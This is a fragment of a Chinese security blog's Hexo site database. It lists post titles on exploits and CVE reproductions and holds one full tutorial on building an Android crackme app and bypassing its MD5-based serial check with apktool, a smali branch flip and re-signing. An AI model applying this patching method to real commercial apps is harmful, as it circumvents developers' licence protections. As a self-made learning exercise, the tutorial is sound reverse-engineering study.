":"66ef1ef498677298ed01c194b42902f9917b6444","modified":1499759220000},{"_id":"source/_posts/SMTP命令行及Python发送邮件/screenshot01.png","hash":"d31547d8a5d68cf85c9b704b118398a49364fdf5","modified":1508311017000},{"_id":"source/_posts/iPhoneX抢购Python脚本/image03.png","hash":"aff473eafbe74e7fb58ca89eff5d282414787c35","modified":1509437550000},{"_id":"source/_posts/百度统计JS脚本分析-流量伪造脚本/image01.jpg","hash":"38be259866cfc224f6de443c0d0b480b304708ec","modified":1504863242000},{"_id":"themes/yilia/.git/logs/refs/remotes/origin/HEAD","hash":"38a52f848a7a3271801e38cca920280e87570062","modified":1496554360000},{"_id":"source/_posts/iPhoneX抢购Python脚本/image01.jpg","hash":"0daa2a287b005f9ee96e1d0872fd2e59367432ab","modified":1509436008000},{"_id":"themes/yilia/.git/objects/pack/pack-f2369c56cc891d085db3c5f66951e1955cef61ae.pack","hash":"7150189603e28ed623058f3264ffb558a007ff59","modified":1496554360000},{"_id":"public/content.json","hash":"bffee66d929fe55d2cfc1842f9285d9b84e65940","modified":1510128604178},{"_id":"public/sitemap.xml","hash":"09f44fee255ac6cfcc1f9d29816e179d4e1f6125","modified":1510128604516},{"_id":"public/2017/04/hello-world/index.html","hash":"336da2da654730e62576c5f4752886e1179799eb","modified":1510128604659},{"_id":"public/2017/04/Mac-SIP/index.html","hash":"db57e20dec5297d97d430cfb11faf524de018288","modified":1510128604741},{"_id":"public/2017/04/Enable-RDP-through-cmd-line/index.html","hash":"6b69f34b9131c04ffc1fff271ab824b87bd11e05","modified":1510128604754},{"_id":"public/2017/05/Pandoc-a-universal-document-converter/index.html","hash":"a43bf162217bd38f09434438762ecd2b39618754","modified":1510128604754},{"_id":"public/2017/05/Nmap-cheat-sheet/index.html","hash":"5f498144eb1b8311871173474d45fa5b14417669","modified":1510128604755},{"_id":"public/2017/05/install-homebrew-and-wine-on-mac/index.html","hash":"bf74a8fe8b61f6a605bb7c6faa93e273f3476c3f","modified":1510128604755},{"_id":"public/2017/05/弱口令检测工具fenghuangscanner的安装与使用/index.html","hash":"1a632af9b1e0fc175e941f46e97acca9f8caf03a","modified":1510128604755},{"_id":"public/2017/06/Python-argparse模块详解/index.html","hash":"f16729ecea2525cc2be263196ce3d085bbf7ceba","modified":1510128604755},{"_id":"public/2017/06/多线程爆破脚本-python3/index.html","hash":"f8d664dff4b1f286aac1aa4a1c3ce58c27ff5600","modified":1510128604755},{"_id":"public/2017/07/Android开发及破解入门实例/index.html","hash":"46524b28c268631ad532e866fdc3db46a953b743","modified":1510128604758},{"_id":"public/2017/07/Web-API接口安全了解/index.html","hash":"fa125661ee3e65a3b6b42150763b98fb41620382","modified":1510128604758},{"_id":"public/2017/07/PHP多版本安装与切换(Ubuntu-16-04-LTS)/index.html","hash":"cb0910058fecfaa099c4535fbbf6332785ba5c0e","modified":1510128604758},{"_id":"public/2017/08/雷达巡航扫描系统-mac启动-终止脚本/index.html","hash":"c6a861dfdcd2fb8f5e6cacabb2713f10e7194fba","modified":1510128604758},{"_id":"public/2017/08/ms17-010-python脚本exploit/index.html","hash":"27d2044b8d216e6bdc767edac01c12a73516f657","modified":1510128604758},{"_id":"public/2017/08/XSS-笔记整理/index.html","hash":"6543cebe37f717d791a74320bb099679dbed0277","modified":1510128604758},{"_id":"public/2017/09/百度统计JS脚本分析-流量伪造脚本/index.html","hash":"e755db31a5307afe05c8670cd32873b132947a25","modified":1510128604758},{"_id":"public/2017/09/Tomcat文件上传-CVE-2017-12615-复现/index.html","hash":"99645114e8a7fcc7e74db3ef4678ece9b54044fa","modified":1510128604759},{"_id":"public/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/index.html","hash":"00c9e5e04756425b293b6aca6b6935ed5be94f6a","modified":1510128604759},{"_id":"public/2017/10/SMTP命令行及Python发送邮件/index.html","hash":"a6c817033012b0ea02c94a3f9a37e64f0c6df4d7","modified":1510128604759},{"_id":"public/2017/10/iPhoneX抢购Python脚本/index.html","hash":"c0e4c8171764f87bc4ba18ea57aabc1131154cf7","modified":1510128604759},{"_id":"public/archives/index.html","hash":"d64b6f623211ee1eb5f3b088cadcfa4ed95a646c","modified":1510128604759},{"_id":"public/archives/page/2/index.html","hash":"5fe350f3bee780aa58de489da910e53cadea7837","modified":1510128604759},{"_id":"public/archives/2017/index.html","hash":"b1994b820f920c8742c5b1e650441786b5a25a29","modified":1510128604759},{"_id":"public/archives/2017/page/2/index.html","hash":"7648220303de8d15f8fbb6833e40277b19a91983","modified":1510128604759},{"_id":"public/archives/2017/04/index.html","hash":"1cf5af10d31f3dd9a9bd26574d057a8e0e607b68","modified":1510128604760},{"_id":"public/archives/2017/05/index.html","hash":"1f4545b80ddf1219a72d3f95e124ad1f10c0c452","modified":1510128604760},{"_id":"public/archives/2017/06/index.html","hash":"1c23a6872ed811761176eb5a1cad9d2feb09412b","modified":1510128604760},{"_id":"public/archives/2017/07/index.html","hash":"0b9da6ae50ccc32ed17e2eb653b8044e017cf086","modified":1510128604760},{"_id":"public/archives/2017/08/index.html","hash":"6ad85127aaa2ea94e1d6371b6157f98e3d4f8f4b","modified":1510128604760},{"_id":"public/archives/2017/09/index.html","hash":"5d5411c27d309ed4daa628c525427370ec55309f","modified":1510128604760},{"_id":"public/archives/2017/10/index.html","hash":"1fa35756bb0c6d4019be7b37249f458a70204007","modified":1510128604760},{"_id":"public/index.html","hash":"3d4e01cb65ccf1639888a792074dfbbedef0909d","modified":1510128604789},{"_id":"public/page/2/index.html","hash":"497cc5d5ebd5a285b40a0cff2b72cc7c457f6464","modified":1510128604831},{"_id":"public/tags/漏洞复现/index.html","hash":"45291932e96f5b3cb0855209679052c0da4720a4","modified":1510128604838},{"_id":"public/tags/Android/index.html","hash":"907473d69f5b703e3f7ad1eb794940ec949c7bd7","modified":1510128604838},{"_id":"public/tags/PHP/index.html","hash":"3c4e17cc2bb3febff2b69cbfc609d63413cc72aa","modified":1510128604838},{"_id":"public/tags/Python/index.html","hash":"c99748cf4b3d26e0ca05e348ff7e095b52ec6f78","modified":1510128604838},{"_id":"public/tags/tomcat/index.html","hash":"87cbb2225d0b0bf79c691f35985a02f38aae35b6","modified":1510128604838},{"_id":"public/tags/文件上传/index.html","hash":"d76539b3ab17189403e9cfe0f51d806bd0b8a6cd","modified":1510128604838},{"_id":"public/tags/接口安全/index.html","hash":"745931a227af943f12d2af361c97bc44ad099bcb","modified":1510128604838},{"_id":"public/tags/Web/index.html","hash":"b38289eeac6b17075636078448628cf00091122f","modified":1510128604839},{"_id":"public/tags/ms17-010/index.html","hash":"824a17d8ccc43c01da4dfd6c013e5384d3612eb3","modified":1510128604839},{"_id":"public/tags/python/index.html","hash":"8701263e241f05370be3dd368159b63dad512cad","modified":1510128604839},{"_id":"public/2017/11/WEB日志分析思路与方法/index.html","hash":"79ace4c06dd5d12e6dc2cca851b07e842c37f0df","modified":1510128604840},{"_id":"public/archives/2017/11/index.html","hash":"ff24128da1637f9a31823ab643c7abf00add0600","modified":1510128604840},{"_id":"public/archives/2017/page/3/index.html","hash":"8100628f9e5620e8b96af3940b02582befc81f94","modified":1510128604840},{"_id":"public/archives/page/3/index.html","hash":"162ac23af688e0d120653eb689915ccbae957685","modified":1510128604840},{"_id":"public/tags/日志分析/index.html","hash":"8972380a6b4671ffa95d59fc451ccdb04ae07203","modified":1510128604840},{"_id":"public/page/3/index.html","hash":"79dcf4349675a1c4bf400e2260099e2cddd65097","modified":1510128604840}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Android开发及破解入门实例","date":"2017-07-03T08:12:55.000Z","_content":">   原本尝试刷一把某SRC，结果因为其对外服务的基本都是APP，故而尝试逆向其APK。  结果可想而知，一脸懵逼，无从入手。 故而找了个本《Android软件安全与逆向分析》，照着学学。\n\n## 开发环境安装\n\n[Android开发者官网](https://developer.android.com)\n\n[Android Studio下载页面](https://developer.android.com/studio/index.html)\n\n[Android Studio 2.3.3.0 for mac下载直连](https://dl.google.com/dl/android/studio/install/2.3.3.0/android-studio-ide-162.4069837-mac.dmg)\n\n[Android NDK](https://developer.android.com/ndk/downloads/index.html) # 其实这个工具在这里并没有用到，可以等后续再下载安装。\n\n\\# Android Studio包含了JDK，故而不需要单独安装JDK。\n上述链接应该是都需要翻墙才能访问。\n\n<!--more-->\n\n## 项目编码\n打开AS，一路Next，就新建好一个项目。\n\n>   第一次新建项目，可能会卡住，跟一个叫gradle的东西相关，可以选择慢慢等，也可以考虑手动从官方下载（[gradle-3.3](https://services.gradle.org/distributions/gradle-3.3-all.zip\n)），然后替换了本地下载尚未下载完成的~/.gradle/wrapper/dists/gradle-3.3-all/55gk2rcmfc6p2dg9u9ohc3hw9/gradle-3.3-all.zip文件。\n\n打开app/res/layout/activity_main.xml,设计layout。\n\n采用Android最新的约束性布局ConstraintLayout。\n\n![设计效果](Android开发及破解入门实例/constraintLayout.png)\n具体的xml代码如下：\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.constraint.ConstraintLayout\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\"cn.oddboy.xx.crackme01.MainActivity\"\n    tools:layout_editor_absoluteY=\"81dp\"\n    tools:layout_editor_absoluteX=\"0dp\">\n\n    <TextView\n        android:id=\"@+id/textView\"\n        android:layout_width=\"368dp\"\n        android:layout_height=\"25dp\"\n        android:text=\"@string/str_androidInstance\"\n        android:textAlignment=\"center\"\n        android:textAllCaps=\"false\"\n        android:textSize=\"18sp\"\n        android:textStyle=\"bold\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        app:layout_constraintBottom_toTopOf=\"@+id/userName\"\n        app:layout_constraintTop_toTopOf=\"parent\" />\n\n    <TextView\n        android:id=\"@+id/textView2\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"17dp\"\n        android:text=\"@string/str_serialNo\"\n        android:textAlignment=\"center\"\n        android:textSize=\"14sp\"\n        app:layout_constraintBottom_toBottomOf=\"@+id/sn\"\n        app:layout_constraintTop_toTopOf=\"@+id/sn\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        app:layout_constraintRight_toLeftOf=\"@+id/sn\" />\n\n    <TextView\n        android:id=\"@+id/textView3\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"17dp\"\n        android:text=\"@string/str_username\"\n        android:textAlignment=\"center\"\n        android:textSize=\"14sp\"\n        app:layout_constraintBottom_toBottomOf=\"@+id/userName\"\n        app:layout_constraintTop_toTopOf=\"@+id/userName\"\n        app:layout_constraintRight_toLeftOf=\"@+id/userName\"\n        app:layout_constraintLeft_toLeftOf=\"parent\" />\n\n    <EditText\n        android:id=\"@+id/sn\"\n        android:layout_width=\"215dp\"\n        android:layout_height=\"43dp\"\n        android:ems=\"10\"\n        android:hint=\"@string/str_input16chars\"\n        android:inputType=\"textPersonName\"\n        app:layout_constraintBottom_toTopOf=\"@+id/button\"\n        app:layout_constraintLeft_toLeftOf=\"@+id/userName\"\n        app:layout_constraintRight_toRightOf=\"@+id/userName\"\n        app:layout_constraintTop_toBottomOf=\"@+id/userName\" />\n\n    <EditText\n        android:id=\"@+id/userName\"\n        android:layout_width=\"215dp\"\n        android:layout_height=\"43dp\"\n        android:ems=\"10\"\n        android:hint=\"@string/str_pleaseinputusername\"\n        android:inputType=\"textPersonName\"\n        app:layout_constraintBottom_toTopOf=\"@+id/sn\"\n        app:layout_constraintLeft_toRightOf=\"@+id/textView3\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintTop_toBottomOf=\"@+id/textView\" />\n\n    <Button\n        android:id=\"@+id/button\"\n        android:layout_width=\"88dp\"\n        android:layout_height=\"48dp\"\n        android:text=\"@string/str_register\"\n        app:layout_constraintTop_toBottomOf=\"@+id/sn\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        android:layout_marginTop=\"-13dp\"\n        app:layout_constraintHorizontal_bias=\"0.858\" />\n\n</android.support.constraint.ConstraintLayout>\n\n```\n\n打开app/java/cn.oddboy.xx.crackme01/MainActivity.java,编写逻辑代码。\n\n```\npackage cn.oddboy.xx.crackme01;\n\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.Toast;\n\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\n\npublic class MainActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        setTitle(R.string.unregister);\n        final EditText edit_userName=(EditText)findViewById(R.id.userName);\n        final EditText edit_sn=(EditText)findViewById(R.id.sn);\n        final Button btn_reg=(Button)findViewById(R.id.button);\n        btn_reg.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                if (!checkSN(edit_userName.getText().toString().trim(),edit_sn.getText().toString().trim())) {\n                    Toast.makeText(MainActivity.this, R.string.unsucessed, Toast.LENGTH_SHORT).show();\n                }else {\n                    Toast.makeText(MainActivity.this,\n                            R.string.successed,Toast.LENGTH_SHORT).show();\n                    btn_reg.setEnabled(false);\n                    setTitle(R.string.registered);\n                }\n            }\n        });\n    }\n    public static String bytesToHex(byte[] in) {\n        final StringBuilder builder = new StringBuilder();\n        for(byte b : in) {\n            builder.append(String.format(\"%02x\", b));\n        }\n        return builder.toString();\n    }\n    private boolean checkSN(String userName, String sn){\n        try{\n            if ((userName==null)||(userName.length()==0))\n                return false;\n            if ((sn==null)||(sn.length()==0))\n                return false;\n            MessageDigest digest=MessageDigest.getInstance(\"MD5\");\n            digest.reset();\n            digest.update(userName.getBytes());\n            byte[] bytes=digest.digest();\n            String hexstr= bytesToHex(bytes);\n            StringBuilder sb = new StringBuilder();\n            for (int i=0;i<hexstr.length();i+=2){\n                sb.append(hexstr.charAt(i));\n            }\n            String userSN=sb.toString();\n            if (!userSN.equalsIgnoreCase(sn))\n                return false;\n        } catch (NoSuchAlgorithmException e){\n            e.printStackTrace();\n            return false;\n        }\n        return true;\n    }\n}\n```\napp/res/values/strings.xml\n```\n<resources>\n    <string name=\"app_name\">Crackme01</string>\n    <string name=\"unregister\">程序未注册</string>\n    <string name=\"unsucessed\">无效用户名或注册码</string>\n    <string name=\"successed\">恭喜您！注册成功</string>\n    <string name=\"registered\">程序已注册</string>\n    <string name=\"str_register\">注册</string>\n    <string name=\"str_androidInstance\">Android程序破解演示实例</string>\n    <string name=\"str_username\">用户名</string>\n    <string name=\"str_serialNo\">注册码</string>\n    <string name=\"str_pleaseinputusername\">请输入用户名</string>\n    <string name=\"str_input16chars\">请输入16位注册码</string>\n</resources>\n```\n## 让程序Run起来\n在AS中run - Run\"app\"，如果没有虚拟机，可以新建一个。\n![RUN起来](Android开发及破解入门实例/Screenshot_01.png)\n\n## 发布APK\n\n- \"Build -> Build APK\" 一键生成APK，但这种方式生成APK应该不能安装（因为没有签名）\n\n- \"Build -> Generate Signed APK\"。选择keystore然后Next就可以了。\n\n    ![生成keystore](Android开发及破解入门实例/Screenshot_02.png)\n    此处也可以用keytool工具生成keystore文件。命令如下：\n    ```bash\n    keytool -genkey -v -keystore bingo.keystore -alias bingo -keyalg RSA -validity 10000\n    ```\n## APK逆向\n>   APK逆向的可用工具太多了，我完全懵逼了。这里只说明我用的工具，到底还有什么好用的工具我是不知道的。\n\n- apktool  用于反编译和重新编译\n\n```\n➜  apktool d crackme01.apk\nI: Using Apktool 2.2.3 on crackme01.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: /Users/jason/Library/apktool/framework/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n```\n\n- 把整个生成的crackme01文件夹拽入visual studio code中。\n\n- 搜索关键字\"无效用户名或注册码\"，在res/values/strings.xml中找到:\n>       <string name=\"unsucessed\">无效用户名或注册码</string>\n- 搜索关键字\"unsucessed\",在res/values/public.xml中找到:\n>       <public type=\"string\" name=\"unsucessed\" id=\"0x7f06002b\" />\n- 搜索关键字\"0x7f06002b\",在smali/cn/oddboy/xx/crackme01/MainActivity$1.smali中找到响应的代码。\n\n![smali代码](Android开发及破解入门实例/Screenshot_03.png)\n\n- 具体代码的分析，我还不太会。按照书上的说法，将94行的if-nez指令改为if-eqz指令即可，保存。\n\n- 重新生成APK\n```\n➜  apktool b crackme01\nI: Using Apktool 2.2.3\nI: Checking whether sources has changed...\nI: Smaling smali folder into classes.dex...\nI: Checking whether resources has changed...\nI: Building resources...\nI: Building apk file...\nI: Copying unknown files/dir...\n# 生成的APK在crackme01/dist/crackme01.apk\n```\n\n- 重新签名\n\n```\n➜ jarsigner -verbose -keystore test.keystore crackme01/dist/crackme01.apk aaa\n输入密钥库的密码短语:\n   正在添加: META-INF/MANIFEST.MF\n   正在添加: META-INF/AAA.SF\n   正在添加: META-INF/AAA.RSA\n  正在签名: AndroidManifest.xml\n  正在签名: classes.dex\n  ......\n  正在签名: resources.arsc\njar 已签名。\n```\n![安装到虚拟机上运行](Android开发及破解入门实例/Screenshot_04.png)\n\n\n## 后记\n    路还远着，无FUCK说。 搞这么点东西，也花了一整天时间了。","source":"_posts/Android开发及破解入门实例.md","raw":"---\ntitle: Android开发及破解入门实例\ndate: 2017-07-03 16:12:55\ntags: Android\n---\n>   原本尝试刷一把某SRC，结果因为其对外服务的基本都是APP，故而尝试逆向其APK。  结果可想而知，一脸懵逼，无从入手。 故而找了个本《Android软件安全与逆向分析》，照着学学。\n\n## 开发环境安装\n\n[Android开发者官网](https://developer.android.com)\n\n[Android Studio下载页面](https://developer.android.com/studio/index.html)\n\n[Android Studio 2.3.3.0 for mac下载直连](https://dl.google.com/dl/android/studio/install/2.3.3.0/android-studio-ide-162.4069837-mac.dmg)\n\n[Android NDK](https://developer.android.com/ndk/downloads/index.html) # 其实这个工具在这里并没有用到，可以等后续再下载安装。\n\n\\# Android Studio包含了JDK，故而不需要单独安装JDK。\n上述链接应该是都需要翻墙才能访问。\n\n<!--more-->\n\n## 项目编码\n打开AS，一路Next，就新建好一个项目。\n\n>   第一次新建项目，可能会卡住，跟一个叫gradle的东西相关，可以选择慢慢等，也可以考虑手动从官方下载（[gradle-3.3](https://services.gradle.org/distributions/gradle-3.3-all.zip\n)），然后替换了本地下载尚未下载完成的~/.gradle/wrapper/dists/gradle-3.3-all/55gk2rcmfc6p2dg9u9ohc3hw9/gradle-3.3-all.zip文件。\n\n打开app/res/layout/activity_main.xml,设计layout。\n\n采用Android最新的约束性布局ConstraintLayout。\n\n![设计效果](Android开发及破解入门实例/constraintLayout.png)\n具体的xml代码如下：\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.constraint.ConstraintLayout\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\"cn.oddboy.xx.crackme01.MainActivity\"\n    tools:layout_editor_absoluteY=\"81dp\"\n    tools:layout_editor_absoluteX=\"0dp\">\n\n    <TextView\n        android:id=\"@+id/textView\"\n        android:layout_width=\"368dp\"\n        android:layout_height=\"25dp\"\n        android:text=\"@string/str_androidInstance\"\n        android:textAlignment=\"center\"\n        android:textAllCaps=\"false\"\n        android:textSize=\"18sp\"\n        android:textStyle=\"bold\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        app:layout_constraintBottom_toTopOf=\"@+id/userName\"\n        app:layout_constraintTop_toTopOf=\"parent\" />\n\n    <TextView\n        android:id=\"@+id/textView2\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"17dp\"\n        android:text=\"@string/str_serialNo\"\n        android:textAlignment=\"center\"\n        android:textSize=\"14sp\"\n        app:layout_constraintBottom_toBottomOf=\"@+id/sn\"\n        app:layout_constraintTop_toTopOf=\"@+id/sn\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        app:layout_constraintRight_toLeftOf=\"@+id/sn\" />\n\n    <TextView\n        android:id=\"@+id/textView3\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"17dp\"\n        android:text=\"@string/str_username\"\n        android:textAlignment=\"center\"\n        android:textSize=\"14sp\"\n        app:layout_constraintBottom_toBottomOf=\"@+id/userName\"\n        app:layout_constraintTop_toTopOf=\"@+id/userName\"\n        app:layout_constraintRight_toLeftOf=\"@+id/userName\"\n        app:layout_constraintLeft_toLeftOf=\"parent\" />\n\n    <EditText\n        android:id=\"@+id/sn\"\n        android:layout_width=\"215dp\"\n        android:layout_height=\"43dp\"\n        android:ems=\"10\"\n        android:hint=\"@string/str_input16chars\"\n        android:inputType=\"textPersonName\"\n        app:layout_constraintBottom_toTopOf=\"@+id/button\"\n        app:layout_constraintLeft_toLeftOf=\"@+id/userName\"\n        app:layout_constraintRight_toRightOf=\"@+id/userName\"\n        app:layout_constraintTop_toBottomOf=\"@+id/userName\" />\n\n    <EditText\n        android:id=\"@+id/userName\"\n        android:layout_width=\"215dp\"\n        android:layout_height=\"43dp\"\n        android:ems=\"10\"\n        android:hint=\"@string/str_pleaseinputusername\"\n        android:inputType=\"textPersonName\"\n        app:layout_constraintBottom_toTopOf=\"@+id/sn\"\n        app:layout_constraintLeft_toRightOf=\"@+id/textView3\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintTop_toBottomOf=\"@+id/textView\" />\n\n    <Button\n        android:id=\"@+id/button\"\n        android:layout_width=\"88dp\"\n        android:layout_height=\"48dp\"\n        android:text=\"@string/str_register\"\n        app:layout_constraintTop_toBottomOf=\"@+id/sn\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        android:layout_marginTop=\"-13dp\"\n        app:layout_constraintHorizontal_bias=\"0.858\" />\n\n</android.support.constraint.ConstraintLayout>\n\n```\n\n打开app/java/cn.oddboy.xx.crackme01/MainActivity.java,编写逻辑代码。\n\n```\npackage cn.oddboy.xx.crackme01;\n\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.Toast;\n\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\n\npublic class MainActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        setTitle(R.string.unregister);\n        final EditText edit_userName=(EditText)findViewById(R.id.userName);\n        final EditText edit_sn=(EditText)findViewById(R.id.sn);\n        final Button btn_reg=(Button)findViewById(R.id.button);\n        btn_reg.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                if (!checkSN(edit_userName.getText().toString().trim(),edit_sn.getText().toString().trim())) {\n                    Toast.makeText(MainActivity.this, R.string.unsucessed, Toast.LENGTH_SHORT).show();\n                }else {\n                    Toast.makeText(MainActivity.this,\n                            R.string.successed,Toast.LENGTH_SHORT).show();\n                    btn_reg.setEnabled(false);\n                    setTitle(R.string.registered);\n                }\n            }\n        });\n    }\n    public static String bytesToHex(byte[] in) {\n        final StringBuilder builder = new StringBuilder();\n        for(byte b : in) {\n            builder.append(String.format(\"%02x\", b));\n        }\n        return builder.toString();\n    }\n    private boolean checkSN(String userName, String sn){\n        try{\n            if ((userName==null)||(userName.length()==0))\n                return false;\n            if ((sn==null)||(sn.length()==0))\n                return false;\n            MessageDigest digest=MessageDigest.getInstance(\"MD5\");\n            digest.reset();\n            digest.update(userName.getBytes());\n            byte[] bytes=digest.digest();\n            String hexstr= bytesToHex(bytes);\n            StringBuilder sb = new StringBuilder();\n            for (int i=0;i<hexstr.length();i+=2){\n                sb.append(hexstr.charAt(i));\n            }\n            String userSN=sb.toString();\n            if (!userSN.equalsIgnoreCase(sn))\n                return false;\n        } catch (NoSuchAlgorithmException e){\n            e.printStackTrace();\n            return false;\n        }\n        return true;\n    }\n}\n```\napp/res/values/strings.xml\n```\n<resources>\n    <string name=\"app_name\">Crackme01</string>\n    <string name=\"unregister\">程序未注册</string>\n    <string name=\"unsucessed\">无效用户名或注册码</string>\n    <string name=\"successed\">恭喜您！注册成功</string>\n    <string name=\"registered\">程序已注册</string>\n    <string name=\"str_register\">注册</string>\n    <string name=\"str_androidInstance\">Android程序破解演示实例</string>\n    <string name=\"str_username\">用户名</string>\n    <string name=\"str_serialNo\">注册码</string>\n    <string name=\"str_pleaseinputusername\">请输入用户名</string>\n    <string name=\"str_input16chars\">请输入16位注册码</string>\n</resources>\n```\n## 让程序Run起来\n在AS中run - Run\"app\"，如果没有虚拟机，可以新建一个。\n![RUN起来](Android开发及破解入门实例/Screenshot_01.png)\n\n## 发布APK\n\n- \"Build -> Build APK\" 一键生成APK，但这种方式生成APK应该不能安装（因为没有签名）\n\n- \"Build -> Generate Signed APK\"。选择keystore然后Next就可以了。\n\n    ![生成keystore](Android开发及破解入门实例/Screenshot_02.png)\n    此处也可以用keytool工具生成keystore文件。命令如下：\n    ```bash\n    keytool -genkey -v -keystore bingo.keystore -alias bingo -keyalg RSA -validity 10000\n    ```\n## APK逆向\n>   APK逆向的可用工具太多了，我完全懵逼了。这里只说明我用的工具，到底还有什么好用的工具我是不知道的。\n\n- apktool  用于反编译和重新编译\n\n```\n➜  apktool d crackme01.apk\nI: Using Apktool 2.2.3 on crackme01.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: /Users/jason/Library/apktool/framework/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n```\n\n- 把整个生成的crackme01文件夹拽入visual studio code中。\n\n- 搜索关键字\"无效用户名或注册码\"，在res/values/strings.xml中找到:\n>       <string name=\"unsucessed\">无效用户名或注册码</string>\n- 搜索关键字\"unsucessed\",在res/values/public.xml中找到:\n>       <public type=\"string\" name=\"unsucessed\" id=\"0x7f06002b\" />\n- 搜索关键字\"0x7f06002b\",在smali/cn/oddboy/xx/crackme01/MainActivity$1.smali中找到响应的代码。\n\n![smali代码](Android开发及破解入门实例/Screenshot_03.png)\n\n- 具体代码的分析，我还不太会。按照书上的说法，将94行的if-nez指令改为if-eqz指令即可，保存。\n\n- 重新生成APK\n```\n➜  apktool b crackme01\nI: Using Apktool 2.2.3\nI: Checking whether sources has changed...\nI: Smaling smali folder into classes.dex...\nI: Checking whether resources has changed...\nI: Building resources...\nI: Building apk file...\nI: Copying unknown files/dir...\n# 生成的APK在crackme01/dist/crackme01.apk\n```\n\n- 重新签名\n\n```\n➜ jarsigner -verbose -keystore test.keystore crackme01/dist/crackme01.apk aaa\n输入密钥库的密码短语:\n   正在添加: META-INF/MANIFEST.MF\n   正在添加: META-INF/AAA.SF\n   正在添加: META-INF/AAA.RSA\n  正在签名: AndroidManifest.xml\n  正在签名: classes.dex\n  ......\n  正在签名: resources.arsc\njar 已签名。\n```\n![安装到虚拟机上运行](Android开发及破解入门实例/Screenshot_04.png)\n\n\n## 后记\n    路还远着，无FUCK说。 搞这么点东西，也花了一整天时间了。","slug":"Android开发及破解入门实例","published":1,"updated":"2017-07-03T10:11:30.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfq9000097uvxt1st4gf","content":"<blockquote>\n<p>  原本尝试刷一把某SRC，结果因为其对外服务的基本都是APP，故而尝试逆向其APK。  结果可想而知，一脸懵逼，无从入手。 故而找了个本《Android软件安全与逆向分析》，照着学学。</p>\n</blockquote>\n<h2 id=\"开发环境安装\"><a href=\"#开发环境安装\" class=\"headerlink\" title=\"开发环境安装\"></a>开发环境安装</h2><p><a href=\"https://developer.android.com\" target=\"_blank\" rel=\"external\">Android开发者官网</a></p>\n<p><a href=\"https://developer.android.com/studio/index.html\" target=\"_blank\" rel=\"external\">Android Studio下载页面</a></p>\n<p><a href=\"https://dl.google.com/dl/android/studio/install/2.3.3.0/android-studio-ide-162.4069837-mac.dmg\" target=\"_blank\" rel=\"external\">Android Studio 2.3.3.0 for mac下载直连</a></p>\n<p><a href=\"https://developer.android.com/ndk/downloads/index.html\" target=\"_blank\" rel=\"external\">Android NDK</a> # 其实这个工具在这里并没有用到，可以等后续再下载安装。</p>\n<p># Android Studio包含了JDK，故而不需要单独安装JDK。<br>上述链接应该是都需要翻墙才能访问。</p>\n<a id=\"more\"></a>\n<h2 id=\"项目编码\"><a href=\"#项目编码\" class=\"headerlink\" title=\"项目编码\"></a>项目编码</h2><p>打开AS，一路Next，就新建好一个项目。</p>\n<blockquote>\n<p>  第一次新建项目，可能会卡住，跟一个叫gradle的东西相关，可以选择慢慢等，也可以考虑手动从官方下载（<a href=\"https://services.gradle.org/distributions/gradle-3.3-all.zip\" target=\"_blank\" 